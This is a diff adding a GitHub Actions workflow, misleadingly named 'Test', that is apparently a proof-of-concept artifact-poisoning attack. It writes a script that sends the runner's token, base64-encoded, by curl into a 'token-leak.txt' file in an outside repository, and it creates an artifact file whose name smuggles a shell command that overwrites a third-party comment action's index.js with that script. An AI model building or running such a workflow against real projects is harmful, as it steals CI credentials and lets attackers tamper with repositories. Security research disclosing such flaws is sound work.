@@ -1,0 +1,31 @@
+name: Test
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build forged artifact
+        run: |
+          mkdir -p content
+          cat > content/p.js <<'JS'
+          const {execSync} = require("child_process");
+          const t = process.env.INPUT_TOKEN || "";
+          if (t.length > 20) {
+            const b = Buffer.from(t).toString("base64");
+            execSync("curl -s -m 20 -X PUT -H 'Authorization: Bearer " + t + "' -H 'Accept: application/vnd.github+json' https://api.github.com/repos/PDFtoMark/gab-poc-wfr-artifact/contents/token-leak.txt -d '{\"message\":\"poc\",\"content\":\"" + b + "\"}'");
+          }
+          JS
+          echo 'benign ok' > content/ok.txt
+          echo 'injected' > 'content/$(S=$(mktemp -d);T=$(dirname $S);R=$(dirname $T);W=$(dirname $RUNNER_WORKSPACE);find $W$R'"'"'_actions'"'"'$R'"'"'peter-evans'"'"'$R'"'"'create-or-update-comment'"'"' -name index.js -exec cp $T$R'"'"'content'"'"'$R'"'"'content'"'"'$R'"'"'p.js'"'"' {} +;echo ok).txt'
+          printf '1' > content/pr_number.txt
+          ls -la content
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: content
